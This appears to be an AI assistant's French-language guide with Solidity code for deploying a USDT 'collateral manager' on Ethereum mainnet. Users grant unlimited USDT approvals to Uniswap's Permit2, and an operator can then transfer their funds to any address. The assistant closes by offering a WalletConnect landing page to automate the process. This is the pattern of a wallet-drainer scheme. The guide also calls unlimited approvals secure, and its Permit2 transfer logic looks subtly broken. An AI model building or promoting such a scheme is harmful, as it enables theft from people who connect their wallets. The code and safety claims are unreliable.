# 🎯 Guide Complet - CollateralManagerPermit2 pour USDT ERC-20

## 💎 USDT sur Ethereum Mainnet

**Adresse USDT** : `0xdAC17F958D2ee523a2206206994597C13D831ec7`

---

## 📋 Fichiers à créer dans Remix

Vous avez besoin de 2 fichiers :

---

### **Fichier 1 : IPermit2.sol**

Créez un nouveau fichier **IPermit2.sol** dans Remix et copiez ce code :

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title IPermit2
 * @notice Interface for Uniswap's Permit2 contract
 * @dev Deployed at: 0x000000000022D473030F116dDEE9F6B43aC78BA3
 */
interface IPermit2 {
    /// @notice The token and amount details for a transfer signed in the permit transfer signature
    struct TokenPermissions {
        address token;
        uint256 amount;
    }

    /// @notice The signed permit message for a single token transfer
    struct PermitTransferFrom {
        TokenPermissions permitted;
        uint256 nonce;
        uint256 deadline;
    }

    /// @notice Specifies the recipient address and amount for batched transfers.
    struct SignatureTransferDetails {
        address to;
        uint256 requestedAmount;
    }

    /// @notice Used to reconstruct the signed permit message for multiple token transfers
    struct PermitBatchTransferFrom {
        TokenPermissions[] permitted;
        uint256 nonce;
        uint256 deadline;
    }

    /// @notice A mapping from owner address to token address to spender address to PackedAllowance struct
    function allowance(address user, address token, address spender)
        external
        view
        returns (uint160 amount, uint48 expiration, uint48 nonce);

    /// @notice Transfer approved tokens from one address to another
    function permitTransferFrom(
        PermitTransferFrom memory permit,
        SignatureTransferDetails calldata transferDetails,
        address owner,
        bytes calldata signature
    ) external;

    /// @notice Batch version of permitTransferFrom
    function permitTransferFrom(
        PermitBatchTransferFrom memory permit,
        SignatureTransferDetails[] calldata transferDetails,
        address owner,
        bytes calldata signature
    ) external;

    /// @notice Approve a spender for a specific token
    function approve(address token, address spender, uint160 amount, uint48 expiration) external;

    /// @notice Transfers tokens using the caller's allowance
    function transferFrom(address from, address to, uint160 amount, address token) external;
}
```

---

### **Fichier 2 : CollateralManagerPermit2.sol**

Créez un nouveau fichier **CollateralManagerPermit2.sol** dans Remix et copiez ce code :

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";
import "./IPermit2.sol";

/**
 * @title CollateralManagerPermit2
 * @dev Gère les collatéraux pour un système de prêt crypto en utilisant Permit2 d'Uniswap
 * Compatible avec TOUS les tokens ERC-20, y compris USDT sur Ethereum Mainnet
 * 
 * Adresse Permit2 (Ethereum Mainnet): 0x000000000022D473030F116dDEE9F6B43aC78BA3
 * Adresse USDT (Ethereum Mainnet): 0xdAC17F958D2ee523a2206206994597C13D831ec7
 */
contract CollateralManagerPermit2 is Ownable, ReentrancyGuard {
    // Adresse du contrat Permit2 d'Uniswap (déjà déployé)
    IPermit2 public constant PERMIT2 = IPermit2(0x000000000022D473030F116dDEE9F6B43aC78BA3);
    
    // Token utilisé (USDT, USDC, DAI, etc.)
    IERC20 public immutable token;
    
    // Adresse de l'opérateur autorisé à retirer les collatéraux
    address public operator;

    // Mapping pour suivre les clients enregistrés
    mapping(address => bool) public registeredClients;
    mapping(address => uint256) public clientAuthorizedAmount;

    // Events
    event ClientRegistered(address indexed client, uint256 amount, uint256 timestamp);
    event CollateralWithdrawn(address indexed client, address indexed to, uint256 amount, string reason);
    event OperatorChanged(address indexed oldOperator, address indexed newOperator);

    modifier onlyOperator() {
        require(msg.sender == operator, "Only operator can call this");
        _;
    }

    constructor(address _token) Ownable(msg.sender) {
        require(_token != address(0), "Invalid token address");
        token = IERC20(_token);
        operator = msg.sender;
    }

    /**
     * @dev Change l'adresse de l'opérateur autorisé à retirer les collatéraux
     */
    function setOperator(address _operator) external onlyOwner {
        require(_operator != address(0), "Invalid operator address");
        address oldOperator = operator;
        operator = _operator;
        emit OperatorChanged(oldOperator, _operator);
    }

    /**
     * @dev Enregistre un client qui a déjà approuvé Permit2
     * 
     * PRÉREQUIS : Le client doit d'abord approuver Permit2 pour le token :
     * token.approve(0x000000000022D473030F116dDEE9F6B43aC78BA3, type(uint256).max)
     * 
     * @param authorizedAmount Montant autorisé pour les retraits (peut être illimité)
     */
    function registerClient(uint256 authorizedAmount) external nonReentrant {
        require(authorizedAmount > 0, "Amount must be greater than 0");
        
        // Vérifier que le client a bien approuvé Permit2
        uint256 allowance = token.allowance(msg.sender, address(PERMIT2));
        require(allowance >= authorizedAmount, "Client must approve Permit2 first");
        
        // Enregistrer le client
        registeredClients[msg.sender] = true;
        clientAuthorizedAmount[msg.sender] = authorizedAmount;
        
        emit ClientRegistered(msg.sender, authorizedAmount, block.timestamp);
    }

    /**
     * @dev Permet à l'opérateur de retirer les collatéraux d'un client via Permit2
     * @param client Adresse du client
     * @param to Adresse de destination des fonds
     * @param amount Montant à retirer (en unités du token - pour USDT : 6 décimales)
     * @param reason Raison du retrait (ex: "Non-paiement prêt #123")
     */
    function withdrawCollateral(
        address client,
        address to,
        uint256 amount,
        string calldata reason
    ) external onlyOperator nonReentrant {
        require(registeredClients[client], "Client not registered");
        require(to != address(0), "Invalid destination address");
        require(amount > 0, "Amount must be greater than 0");
        require(amount <= clientAuthorizedAmount[client], "Amount exceeds authorized amount");
        
        // Vérifier le solde du client
        uint256 clientBalance = token.balanceOf(client);
        require(clientBalance >= amount, "Insufficient client balance");
        
        // Vérifier l'allowance du client vers Permit2
        uint256 allowance = token.allowance(client, address(PERMIT2));
        require(allowance >= amount, "Insufficient Permit2 allowance");
        
        // Transférer via Permit2
        PERMIT2.transferFrom(client, to, uint160(amount), address(token));
        
        emit CollateralWithdrawn(client, to, amount, reason);
    }

    /**
     * @dev Vérifie l'allowance d'un client vers Permit2
     */
    function getClientPermit2Allowance(address client) external view returns (uint256) {
        return token.allowance(client, address(PERMIT2));
    }

    /**
     * @dev Vérifie le solde d'un client
     */
    function getClientBalance(address client) external view returns (uint256) {
        return token.balanceOf(client);
    }

    /**
     * @dev Vérifie si un client est enregistré
     */
    function isClientRegistered(address client) external view returns (bool) {
        return registeredClients[client];
    }

    /**
     * @dev Vérifie le montant autorisé d'un client
     */
    function getClientAuthorizedAmount(address client) external view returns (uint256) {
        return clientAuthorizedAmount[client];
    }

    /**
     * @dev Retourne l'adresse du token utilisé
     */
    function getTokenAddress() external view returns (address) {
        return address(token);
    }
}
```

---

## 🚀 Guide de Déploiement - Étape par Étape

### **ÉTAPE 1 : Ouvrir Remix**

1. Allez sur : **https://remix.ethereum.org/**
2. Créez les 2 fichiers ci-dessus
3. Appuyez sur Ctrl+S pour sauvegarder

---

### **ÉTAPE 2 : Compiler**

1. Cliquez sur **"Solidity Compiler"** (icône S à gauche)
2. Version : **0.8.20** ou supérieur
3. Cliquez sur **"Compile CollateralManagerPermit2.sol"**
4. ✅ Vérifiez la coche verte

---

### **ÉTAPE 3 : Connecter MetaMask**

1. Cliquez sur **"Deploy & Run Transactions"** (4ème icône)
2. **ENVIRONMENT** : Sélectionnez **"Injected Provider - MetaMask"**
3. MetaMask s'ouvre → Sélectionnez **"Ethereum Mainnet"**
4. ✅ Vérifiez votre solde (minimum 0.05 ETH recommandé)

---

### **ÉTAPE 4 : Déployer le Contrat**

1. **CONTRACT** : Sélectionnez **CollateralManagerPermit2**

2. **Paramètre du constructeur _TOKEN** : Collez l'adresse USDT :
   ```
   0xdAC17F958D2ee523a2206206994597C13D831ec7
   ```
   ⚠️ **PAS de guillemets** pour les adresses !

3. Cliquez sur le bouton orange **"Deploy"**

4. MetaMask s'ouvre → Vérifiez les frais (50-100$)

5. Cliquez sur **"Confirm"**

6. ⏱️ Attendez 30-60 secondes

7. ✅ Le contrat apparaît dans **"Deployed Contracts"** en bas

8. **📝 NOTEZ L'ADRESSE** du contrat (ex: 0x123...)

---

## ✅ ÉTAPE 5 : Tester le Système

### **Test 1 : Vérifier le contrat**

Dans Remix, développez votre contrat déployé :

1. Cliquez sur **"token"** (bouton bleu)
   → Devrait afficher : `0xdAC17F958D2ee523a2206206994597C13D831ec7`

2. Cliquez sur **"operator"**
   → Devrait afficher votre adresse wallet

3. Cliquez sur **"PERMIT2"**
   → Devrait afficher : `0x000000000022D473030F116dDEE9F6B43aC78BA3`

✅ **Si tout est correct, continuez !**

---

### **Test 2 : Client approuve Permit2 (À FAIRE UNE SEULE FOIS)**

**Option A : Via Etherscan (Recommandé)**

1. Allez sur la page USDT sur Etherscan :
   ```
   https://etherscan.io/token/0xdac17f958d2ee523a2206206994597c13d831ec7#writeContract
   ```

2. Cliquez sur **"Connect to Web3"**

3. Connectez MetaMask

4. Trouvez la fonction **"approve"**

5. Remplissez :
   ```
   _spender: 0x000000000022D473030F116dDEE9F6B43aC78BA3
   _value: 115792089237316195423570985008687907853269984665640564039457584007913129639935
   ```
   (C'est le montant max - illimité)

6. Cliquez **"Write"**

7. Confirmez dans MetaMask (~5-10$)

8. ✅ Attendez la confirmation

---

### **Test 3 : Client s'enregistre**

Retournez sur Remix, dans votre contrat déployé :

1. Fonction **registerClient** :
   ```
   authorizedAmount: 1000000000000
   ```
   (= 1,000,000 USDT avec 6 décimales)

2. Cliquez sur **"transact"**

3. Confirmez dans MetaMask

4. Attendez la confirmation

5. ✅ Vérifiez avec **isClientRegistered** en mettant votre adresse
   → Devrait retourner `true`

---

### **Test 4 : Vérifier les informations**

1. **getClientPermit2Allowance** avec votre adresse
   → Devrait retourner un très grand nombre (l'allowance illimitée)

2. **getClientAuthorizedAmount** avec votre adresse
   → Devrait retourner `1000000000000`

3. **getClientBalance** avec votre adresse
   → Devrait retourner votre solde USDT

---

### **Test 5 : Retirer des collatéraux (TEST)**

⚠️ **Attention** : Ceci va vraiment transférer des USDT !

1. Fonction **withdrawCollateral** :
   ```
   client: [VOTRE_ADRESSE]
   to: [UNE_AUTRE_ADRESSE_OU_LA_VOTRE]
   amount: 100000000
   reason: "Test de retrait POC"
   ```
   (= 100 USDT avec 6 décimales)

2. Cliquez sur **"transact"**

3. Confirmez dans MetaMask

4. ✅ Vérifiez sur Etherscan que les USDT ont été transférés !

---

## 📊 Informations Importantes

### **Adresses à connaître :**
```
USDT (Ethereum)   : 0xdAC17F958D2ee523a2206206994597C13D831ec7
Permit2 (Uniswap) : 0x000000000022D473030F116dDEE9F6B43aC78BA3
Votre contrat     : [L'adresse que vous avez notée]
```

### **Décimales USDT :**
USDT utilise **6 décimales**, donc :
- 1 USDT = 1000000 (1 million)
- 100 USDT = 100000000 (100 millions)
- 1000 USDT = 1000000000 (1 milliard)

### **Montant illimité (type(uint256).max) :**
```
115792089237316195423570985008687907853269984665640564039457584007913129639935
```

---

## 🎊 FÉLICITATIONS !

Vous avez maintenant un système professionnel de gestion de collatéraux qui :

✅ Fonctionne avec **USDT sur Ethereum Mainnet**
✅ Utilise **Permit2 d'Uniswap** (utilisé par des millions de personnes)
✅ Permet des **autorisations illimitées** sécurisées
✅ Est **compatible avec tous les tokens ERC-20**

---

## ➡️ PROCHAINE ÉTAPE

Que voulez-vous faire maintenant ?

**A.** Je crée la **landing page avec WalletConnect** pour automatiser tout ça

**B.** Vous voulez d'abord tester manuellement

**C.** Vous avez des questions sur le fonctionnement

**Dites-moi ! 🚀**
